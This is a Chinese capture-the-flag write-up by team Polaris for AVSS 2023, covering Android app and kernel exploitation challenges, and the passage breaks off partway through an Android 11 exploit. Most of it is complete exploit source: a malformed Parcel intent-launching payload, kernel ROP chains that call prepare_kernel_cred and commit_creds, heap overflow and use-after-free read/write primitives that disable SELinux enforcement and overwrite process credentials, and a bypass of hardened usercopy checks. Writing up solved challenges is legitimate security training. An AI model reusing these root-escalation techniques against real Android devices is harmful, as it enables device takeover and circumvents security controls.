# AVSS 2023 Writeup

> 原文: https://www.ctfiot.com/132758.html
> ID: 132758

本次 AVSS 2023，我们 Polaris 战队排名第5。

APP-VulnParcel

01

Android 12 – arm64

package com.test.chall_exploit;
import android.content.Intent;import android.os.Bundle;import android.os.Parcel;
public class comm implements IGenerateMalformedParcel{
    @Override    public Parcel generate(Intent intent) {
        Bundle bundle = new Bundle();        Parcel obtain = Parcel.obtain();        Parcel obtain2 = Parcel.obtain();        Parcel obtain3 = Parcel.obtain();        obtain.writeInt(-1);        obtain.writeInt(0x4c444E42); 
        obtain2.writeInt(3);        obtain2.writeString("launchanywhere");        obtain2.writeInt(4);        obtain2.writeString("android.os.VulnParcelable");        obtain2.writeInt(1);        obtain2.writeInt(0);        obtain2.writeInt(0); 
        obtain2.writeInt(13);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(13);        obtain2.writeInt(56);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(1);        obtain2.writeInt(1);        obtain2.writeInt(13);        obtain2.writeInt(22);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(13);        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();        obtain2.writeString("intent");        obtain2.writeInt(4);        obtain2.writeString("android.content.Intent");        intent.writeToParcel(obtain3, 0);        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();        obtain2.setDataPosition(dataPosition - 4);        obtain2.writeInt(dataPosition2 - dataPosition);        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();        obtain.setDataPosition(0);        obtain.writeInt(dataSize);        obtain.appendFrom(obtain2, 0, dataSize);        obtain.setDataPosition(0);
        return obtain;    }}

APP-expReceiver

<receiver    android:name="com.avss.testreceiver.MyBroadcastReceiver">    <intent-filter>        <action android:name="com.avss.testreceiver.GET_FLAG" />    </intent-filter></receiver>

01

Android 7 – arm64

am broadcast -a com.avss.testreceiver.GET_FLAG com.avss.testreceiverlogcat

02

Android 8 – arm64

am broadcast -a com.avss.testreceiver.GET_FLAG --es sms_body '1' -n com.avss.testreceiver/.IntentReceiverlogcat -d | grep flag

Kernel-kStackOverflow

+noinline long stackof_read(char __user * addr, unsigned long len) {+    char buffer[0x100];+    long ans;+    memset(buffer, 0, sizeof(buffer));+    ans=my_ctu(buffer,addr,len);+    return ans;+}++noinline long sys_stackof_handler(char __user * addr, unsigned long len, int option) {    +    if(option){+      return stackof_read(addr,len);+    }+    else{+      return stackof_write(addr,len);+    }+}

01

Android 7 – x86

栈溢出构建ROP链，可能是返回用户态的时候有问题，得到的进程虽然是root权限，但是很多系统调用都无法正常执行了，因此在有限系统调用的情况下利用共享内存来读取并输出flag。

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = 0x61; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000C1354; i += 8; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000C0E1C; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x18;    *(size_t *)(buf + i) = 0xffffffc000084270; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0x118;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x900 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x118);    printf("ret_addr: %#lxn", ret_addr);}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}

02

Android 8 – x86

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    printf("get_root %lxn", (size_t)get_root);    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = 0x61; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BCCF0; i += 8; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BC920; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x18;    *(size_t *)(buf + i) = 0xffffffc0000864a4; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0x128;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x900 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x118);    printf("ret_addr: %#lxn", ret_addr);}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}

01

Android 9 – x86

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    printf("get_root %lxn", (size_t)get_root);    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = 0x61; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BC900; i += 8; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BC530; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x18;    *(size_t *)(buf + i) = 0xffffffc0000864a4; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0x128;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x900 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x118);    printf("ret_addr: %#lxn", ret_addr);}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}

04

Android 10 – x86

Android 10 中有 canary 验证

因此需要先泄漏出 canary 。

__int64 __fastcall stackof_write(__int64 a1, __int64 a2){  __int64 result; // x0  __int64 v3; // x0  __int64 v4[32]; // [xsp+8h] [xbp-118h] BYREF  __int64 v5; // [xsp+108h] [xbp-18h]
  v5 = canary;  memset(v4, 0, sizeof(v4));  result = my_cfu(v4, a1, a2);  if ( canary != v5 )  {    v3 = sub_FFFFFF80080AE1A0(result);    return sub_FFFFFF80080DB1F0(v3);  }  return result;}

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;size_t canary = 0;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    printf("get_root %lxn", (size_t)get_root);    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = canary; i += 8;    *(size_t *)(buf + i) = 0x61; i += 0x18;    *(size_t *)(buf + i) = 0xffffff8008080000 + 0x000000000039cc30; i += 0x18; // ldr x0, [sp, #0x10]; ldp x29, x30, [sp, #0x50]; add sp, sp, #0x60; ret;    *(size_t *)(buf + i) = 0xFFFFFF8008E99F08 - 0x90; i += 0x48;
    *(size_t *)(buf + i) = 0xffffff8008080000 + 0x000000000004c424; i += 0x10; // ldr x0, [x0, #0x90]; ldp x29, x30, [sp], #0x10; ret;    *(size_t *)(buf + i) = 0xffffff8008080000 + 0x0000000000049268; i += 0x60; // ldp x29, x30, [sp, #0x50]; ldp x20, x19, [sp, #0x40]; ldp x22, x21, [sp, #0x30]; add sp, sp, #0x60; ret;    *(size_t *)(buf + i) = 0xFFFFFF80080D8A40; i += 0x28; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFF80080D8670; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x28;    *(size_t *)(buf + i) = 0xffffff8008083c2c; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0xf8;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x108 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x100);    printf("ret_addr: %#lxn", ret_addr);    canary = ret_addr;}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        leak();        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}

Kernel-kHeapUserCopy

+noinline void show_buffer(char __user * addr, unsigned long len, unsigned int idx) {+    if (gst1[idx]) {+        my_ctu(gst1[idx]->name, addr, len);+    }+}++noinline void edit_buffer(char __user * addr, unsigned long len, unsigned int idx) {+    if (gst1[idx]) {+        my_cfu(gst1[idx]->name, addr, len);+    }+}

01

Android 7 – x86

分为三步执行

第一，先申请两个slab

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>
#define __NR_easyof 602
int main(){    setbuf(stdout, NULL);
    syscall(__NR_easyof, NULL, 0, 0x0101);    syscall(__NR_easyof, NULL, 0, 0x0201);    syscall(__NR_easyof, NULL, 0, 0x0100);    syscall(__NR_easyof, NULL, 0, 0x0200);
    // dmesg | grep p1
    return 0;}

第二，执行 dmesg | grep p1 

获取两个 slab 的地址

第三，根据两个 slab 地址计算偏移，从而修改高位地址的 gst1[max_index]->funcptr 为 onestep ，并触发该指针，然后就获取了 root 权限

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>
#define __NR_easyof 602
int main(){    size_t p1, p2;    size_t min_p, max_p, min_index, max_index, offset;    char *ptr;    char buf[0x100];    uid_t uid;    int fd;
    setbuf(stdout, NULL);    printf("p1: ");    scanf("%lx", &p1);
    printf("p2: ");    scanf("%lx", &p2);
    if(p1 > p2)    {        min_p = p2;        min_index = 2;        max_p = p1;        max_index = 1;    }    else    {        min_p = p1;        min_index = 1;        max_p = p2;        max_index = 2;    }
    printf("min_p: %#lxn", min_p);    printf("max_p: %#lxn", max_p);    offset = max_p - min_p;    printf("offset: %#lxn", offset);    ptr = calloc(1, offset + 8);
    syscall(__NR_easyof, ptr, offset, (min_index << 8)|2);    printf("func: %pn", *(char **)(ptr + offset - 8));    *(size_t*)(ptr + offset - 8) = 0xffffffc0000c308c; // onestep    syscall(__NR_easyof, ptr, offset, (min_index << 8)|3);    if(syscall(__NR_easyof, NULL, 0, (max_index << 8)|4) == -1)    {        perror("easyof");        exit(EXIT_FAILURE);    }
    uid = getuid();    printf("uid: %dn", uid);
    if(uid == 0)    {        fd = open("/system/flag", O_RDONLY);        if(fd == -1)        {            perror("open");            exit(EXIT_FAILURE);        }
        memset(buf, 0, sizeof(buf));        read(fd, buf, sizeof(buf)-1);        puts(buf);    }
    puts("END");
    return 0;}

Kernel-kSysUAF

+noinline void del_buffer(unsigned int idx) {+    if (gst1[idx]) {+        kfree(gst1[idx]);+        // gst1[idx] = NULL;+    }+}

01

Android 7 – x86

#include <unistd.h>#include <signal.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <stdint.h>#include <fcntl.h>#include <sys/prctl.h>#include <sys/syscall.h>#include <sys/ipc.h>#include <sys/msg.h>#include <sched.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sched.h>#include <unistd.h>
// #include "include/utils.h"
#ifndef _UTILS_H#define _UTILS_H
#include <stdio.h>#include <stdio.h>#include <string.h>#include <errno.h>#include <stdint.h>#include <unistd.h>#include <time.h>#include <sys/syscall.h>

#define hexd(f_, ...) {printf(f_, ##__VA_ARGS__);}
#define ADDR 1#define ASCL 1
void hexdump_fish(void* buf, uint64_t size, void *addr) {    unsigned int col = 0, off = 0;    unsigned char* p = (unsigned char*)buf;    hexd("%08lx:n", (uint64_t)addr);    char chr[0x10];    while (size--) {   #ifdef ADDR        /********** address print *********/        if (!col)            hexd("%08lx:", off + (uint64_t)addr);#endif        chr[col] = *p;        hexd(" %02x", *p++);        off++;        col++;        if (!(col % 16)) {#ifdef ASCL            /********** ascll print *********/            hexd("  |  ");            for (int i=0; i<16; i++) {                if (chr[i] >= 0x20 && chr[i] < 0x7f) {                    hexd("%c", chr[i]);                }                else {                    hexd("`");                }            }#endif            hexd("n");            col = 0;        } else if (!(col % 4))            hexd("  ");    }    for (int i=0; i<off%16; i++)        hexd("%c", chr[i]);    hexd("n");    }
#endif
#define __NR_testtest 600#define __NR_uaf 602
typedef struct {    char name[256];    char str[128];} my_struct;
char buf[256] = {0};
int new_uaf(int idx) {        int option = (idx << 8) + 0;    return syscall(__NR_uaf, NULL, 0, option);}
int del_uaf(int idx) {        int option = (idx << 8) + 1;    return syscall(__NR_uaf, NULL, 0, option);}
int show_uaf(void *addr, uint64_t len, int idx) {
    int option = (idx << 8) + 2;
    return syscall(__NR_uaf, addr, len, option);}
int edit_uaf(void *addr, uint64_t len, int idx) {
    int option = (idx << 8) + 3;
    return syscall(__NR_uaf, addr, len, option);}
int get_current(uint64_t init_task, uint64_t offset, uint64_t cred) {      // get task_struct->tasks.prev    *(uint64_t*)buf = init_task + offset + 8;    edit_uaf(buf, 0x8, 12);    show_uaf(buf, 0x10, 0);    hexdump_fish(buf, 0x10, buf);        *(uint64_t*)buf = *(uint64_t*)buf - offset + cred;    edit_uaf(buf, 0x8, 12);    show_uaf(buf, 0x10, 0);    hexdump_fish(buf, 0x10, buf);
    edit_uaf(buf, 0x8, 12);    show_uaf(buf, 0x40, 0);    hexdump_fish(buf, 0x40, buf);        if (!*(uint32_t*)(buf+0x4))        return -1;
    memset(buf+0x4, 0x0, 0x30);    edit_uaf(buf, 0x30, 0);
    return 0;}

int main(int argc, char *argv[]) {    printf("fishn");
    printf("size: %#lxn", sizeof(my_struct));
    for (int i=0; i<10; i++)        new_uaf(i);    del_uaf(0);    del_uaf(1);    del_uaf(2);        *(uint64_t*)buf = 0xFFFFFFC0006E15E8;    edit_uaf(buf, 0x8, 2);
    new_uaf(11);    new_uaf(12);    // memset(buf, 0x0, 0x100);    // show_uaf(buf, 0x100, 12);    // hexdump_fish(buf, 0x100, buf);        // selinux_enforcing    *(uint64_t*)buf = 0xFFFFFFC0006EBACC;    edit_uaf(buf, 0x8, 12);    //show_uaf(buf, 0x10, 0);    //hexdump_fish(buf, 0x10, buf);    *(uint32_t*)buf = 0x0;    edit_uaf(buf, 0x4, 0);        // init_task    int ret = get_current(0xFFFFFFC00069B820, 0x170, 0x3a0);        if (!ret) {        int fd = open("/system/flag", O_RDONLY);        read(fd, buf, 0x40);        printf("%sn", buf);    }    return 0;}

02

Android 8 – x86

03

Android 9 – x86

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_uaf 602
// #define DEBUG#ifndef DEBUG#define printf(...)#define fprintf(...)#define perror(...)#define puts(...)#define setbuf(...)#endif
size_t read_word(size_t addr){    size_t result = 0;    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &result, 8, (0 << 8)|2);    return result;}
size_t write_word(size_t addr, size_t value){    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &value, 8, (0 << 8)|3);    return 0;}
size_t get_current_task(){    int pid = getpid();    size_t init_task = 0xffffffc000934e80, task = init_task;    size_t result = 0;    int task_pid = 0;    int i = 0;
    #define PID_OFFSET 0x438    #define TASK_OFFSET 0x348
    while(result == 0 && i++ < 1024)    {        task = read_word(task + TASK_OFFSET) - TASK_OFFSET;        if(task == init_task)        {            break;        }        task_pid = read_word(task + PID_OFFSET);        if(task_pid == pid)        {            result = task;        }    }
    return result;}
int exploit(){    char buf[0x100];    size_t current_task = 0;    size_t cred = 0;
    syscall(__NR_uaf, NULL, 0, (0 << 8)|0);    syscall(__NR_uaf, NULL, 0, (1 << 8)|0);    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0xffffffc000988618;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);    syscall(__NR_uaf, NULL, 0, (2 << 8)|0);    syscall(__NR_uaf, NULL, 0, (3 << 8)|0);
    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);
    *(size_t*)(buf+0) = 0xffffffc0009c33b4; // selinux_enforcing    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 4, (0 << 8)|3);
    current_task = get_current_task();    printf("current_task: %#lxn", current_task);    cred = read_word(current_task + 0x5d0);    printf("cred: %#lxn", cred);
        *(size_t*)(buf+0) = cred + 4;    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x20, (0 << 8)|3);
    printf("uid: %dn", getuid());
    return 0;}
int readflag(){    int fd = 0;    char buf[0x100];    int result;
    fd = open("/system/flag", O_RDONLY);    if(fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    memset(buf, 0, sizeof(buf));    result = read(fd, buf, sizeof(buf)-1);    printf("result: %dn", result);    write(STDOUT_FILENO, buf, result);
    close(fd);
    return 0;}

int main(){    setbuf(stdout, NULL);
    puts("Start");
    exploit();
    readflag();
    puts("End");
    return 0;}

04

Android 10 – x86

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_uaf 602
#define DEBUG#ifndef DEBUG#define printf(...)#define fprintf(...)#define perror(...)#define puts(...)#define setbuf(...)#endif
size_t read_word(size_t addr){    size_t result = 0;    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &result, 8, (0 << 8)|2);    return result;}
size_t write_word(size_t addr, size_t value){    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &value, 8, (0 << 8)|3);    return 0;}
size_t get_current_task(){    size_t init_task = 0xffffff8008dbaf80, task = init_task;    size_t result = 0;    size_t name = 0;    int i = 0;
    #define NAME_OFFSET 0x750    #define TASK_OFFSET 0x4a8
    while(result == 0 && i++ < 1024)    {        task = read_word(task + TASK_OFFSET) - TASK_OFFSET;        printf("task: %#llxn", task);        if(task == init_task)        {            break;        }        name = read_word(task + NAME_OFFSET);        printf("name: %sn", (char *)&name);        if((name & 0xffffff) == 0x00707865) // "exp"        {            result = task;        }    }
    return result;}
int exploit(){    char buf[0x100];    size_t current_task = 0;    size_t cred = 0;
    syscall(__NR_uaf, NULL, 0, (0 << 8)|0);    syscall(__NR_uaf, NULL, 0, (1 << 8)|0);    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0xffffff8008e9bfb0;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);    syscall(__NR_uaf, NULL, 0, (2 << 8)|0);    syscall(__NR_uaf, NULL, 0, (3 << 8)|0);
    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);
    *(size_t*)(buf+0) = 0xffffff8008eda7f0; // selinux_enforcing    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 4, (0 << 8)|3);
    current_task = get_current_task();    printf("current_task: %#lxn", current_task);    cred = read_word(current_task + 0x740);    printf("cred: %#lxn", cred);
        *(size_t*)(buf+0) = cred + 4;    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x20, (0 << 8)|3);
    printf("uid: %dn", getuid());
    return 0;}
int readflag(){    int fd = 0;    char buf[0x100];    int result;
    fd = open("/system/flag", O_RDONLY);    if(fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    memset(buf, 0, sizeof(buf));    result = read(fd, buf, sizeof(buf)-1);    printf("result: %dn", result);    write(STDOUT_FILENO, buf, result);
    close(fd);
    return 0;}

int main(){    setbuf(stdout, NULL);
    puts("Start");
    exploit();
    readflag();
    puts("End");
    return 0;}

05

Android 11 – arm64

先利用 /dev/ptmx 来泄漏 slab 地址

从而劫持 freelist 到 gst1 以达到任意地址读写的目的。

该题内核的 copy_from_user 和 copy_to_user 

设置了限制，正常情况下无法读写 task_struct。

通过调试这两个函数来到函数 

0xFFFFFFC01042451C 

猜测该函数为 check_object 函数，继续查看内部调用。

内核执行到函数 0xFFFFFFC010406170 会抛出异常， 因此需要设法绕过该函数。

unsigned __int64 __fastcall sub_FFFFFFC01042451C(unsigned __int64 result, unsigned __int64 a2, char a3){  unsigned __int64 v3; // x30  char *v4; // x18  unsigned __int64 v7; // x20  __int64 (__fastcall *v8)(); // x11  unsigned __int64 v9; // x8  __int64 v10; // x9  __int64 v11; // x8  __int64 v12; // x2  __int64 v13; // x8  _QWORD *v14; // x8  unsigned __int64 v15; // x0  __int64 v16; // x1
  __writex18qword(8u, v3);  v4 = (char *)KeGetPcr() + 8;  __setReg(18, v4);  if ( !a2 )    goto LABEL_5;  v7 = result;  if ( a2 - 1 > ~result )    goto LABEL_21;  if ( result <= 0x10 )  {LABEL_22:    sub_FFFFFFC010424488("null address", 0i64, a3 & 1, v7, a2);    goto LABEL_23;  }  result = sub_FFFFFFC0104246FC(result, a2);  if ( (unsigned int)(result - 1) < 2 )  {LABEL_5:    __setReg(18, v4 - 8);    __setReg(18, (char *)KeGetPcr() - 8);    return result;  }  if ( (_DWORD)result )  {    sub_FFFFFFC010424488("process stack", 0i64, a3 & 1, 0i64, a2);LABEL_21:    sub_FFFFFFC010424488("wrapped address", 0i64, a3 & 1, 0i64, v7 + a2);    goto LABEL_22;  }  result = sub_FFFFFFC010216910(v7 >> 12);  if ( (_DWORD)result )  {    v9 = ((v7 + 0x8000000000i64) >> 6) & 0x3FFFFFFFFFFFFC0i64;    v10 = *(_QWORD *)(v9 - 0x1001FFFF8i64);    v11 = v9 - 0x100200000i64;    if ( (v10 & 1) != 0 )      v12 = v10 - 1;    else      v12 = v11;    v13 = *(_QWORD *)(v12 + 8);    if ( (v13 & 1) != 0 )      v14 = (_QWORD *)(v13 - 1);    else      v14 = (_QWORD *)v12;    if ( (*v14 & 0x200) != 0 )      result = sub_FFFFFFC010406170(v7, a2, v12, a3 & 1);  }  v8 = sub_FFFFFFC010081000;  if ( v7 >= (unsigned __int64)&unk_FFFFFFC010E40000 || v7 + a2 <= (unsigned __int64)sub_FFFFFFC010081000 )    goto LABEL_5;LABEL_23:  v15 = sub_FFFFFFC010424488("kernel text", 0i64, a3 & 1, v7 - (_QWORD)v8, a2);  return sub_FFFFFFC0104246FC(v15, v16);}

追溯到函数 0xFFFFFFC010216910 中

该函数的结果将决定是否会触发函数

 0xFFFFFFC010406170。

__int64 __fastcall sub_FFFFFFC010216910(unsigned __int64 a1){  unsigned __int64 v1; // x30  char *v2; // x18  __int64 v3; // x8  _BYTE *v4; // x8  __int64 result; // x0
  __writex18qword(8u, v1);  v2 = (char *)KeGetPcr() + 8;  __setReg(18, v2);  if ( !(a1 >> 52)    && !(a1 >> 36)    && qword_FFFFFFC011A7A8A8    && (v3 = *(_QWORD *)(qword_FFFFFFC011A7A8A8 + ((a1 >> 23) & 0x1FFFFFFFFF8i64))) != 0    && (v4 = (_BYTE *)(v3 + 16i64 * (unsigned __int8)(a1 >> 18))) != 0i64    && (*v4 & 2) != 0 )  {    result = sub_FFFFFFC0103F9640(a1 << 12) & 1;  }  else  {    result = 0i64;  }  __setReg(18, v2 - 8);  __setReg(18, (char *)KeGetPcr() - 8);  return result;}

函数 0xFFFFFFC010216910 逻辑比较简单

只需要把 

qword_FFFFFFC011A7A8A8

（在/proc/kallsyms中的变量名为mem_section） 

置空就可以使得该函数一直返回 0 ，则内核不会执行到异常处理函数 0xFFFFFFC010406170 ，从而可以正常读写 task_struct。

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_uaf 602
#define DEBUG#ifndef DEBUG#define printf(...)#define fprintf(...)#define perror(...)#define puts(...)#define setbuf(...)#endif
size_t read_word(size_t addr){    size_t result = 0;    syscall(__NR_uaf, &addr, 8, (7 << 8)|3);    syscall(__NR_uaf, &result, 8, (8 << 8)|2);    return result;}
size_t write_word(size_t addr, size_t value){    syscall(__NR_uaf, &addr, 8, (7 << 8)|3);    syscall(__NR_uaf, &value, 8, (8 << 8)|3);    return 0;}
size_t get_current_task(){    size_t init_task = 0xffffffc011953e00, task = init_task;    size_t result = 0;    size_t name = 0;    int i = 0;
    #define NAME_OFFSET 0x750    #define TASK_OFFSET 0x488
